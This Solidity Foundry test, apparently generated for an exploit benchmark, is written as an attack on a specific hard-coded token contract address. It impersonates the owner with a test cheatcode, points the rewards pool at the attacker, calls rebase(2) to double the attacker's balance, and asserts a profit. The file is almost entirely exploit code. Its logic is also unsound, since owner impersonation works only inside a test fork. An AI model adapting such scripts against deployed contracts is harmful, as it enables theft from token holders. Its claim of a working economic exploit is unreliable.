// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface GoldHunt {
    function owner() external view returns (address);
    function rewardsPool() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function rebase(uint multiple) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).balanceOf(address(this));

        // Step 1: Get the current owner
        address contractOwner = GoldHunt(TARGET).owner();

        // Step 2: Impersonate the owner
        vm.startPrank(contractOwner);

        // Step 3: Check if rewardsPool is set, if not set it to attacker
        address currentRewardsPool = GoldHunt(TARGET).rewardsPool();
        if (currentRewardsPool == address(0)) {
            GoldHunt(TARGET).setRewardsPool(attacker);
        }

        // Step 4: Get attacker's initial balance
        uint256 initialBalance = GoldHunt(TARGET).balanceOf(attacker);

        // Step 5: Call rebase with multiple = 2 to double the balance
        GoldHunt(TARGET).rebase(2);

        // Step 6: Get new balance
        uint256 newBalance = GoldHunt(TARGET).balanceOf(attacker);

        // Step 7: Stop impersonation
        vm.stopPrank();

        // Step 8: Verify profit
        assertGt(newBalance, initialBalance, "Attacker balance should increase after rebase");

        // Optional: Show the profit amount
        uint256 profit = newBalance - initialBalance;
        console.log("Initial balance:", initialBalance);
        console.log("New balance:", newBalance);
        console.log("Profit:", profit);

        uint256 finalBalance = IERC20(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).balanceOf(address(this));
        assertGt(finalBalance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
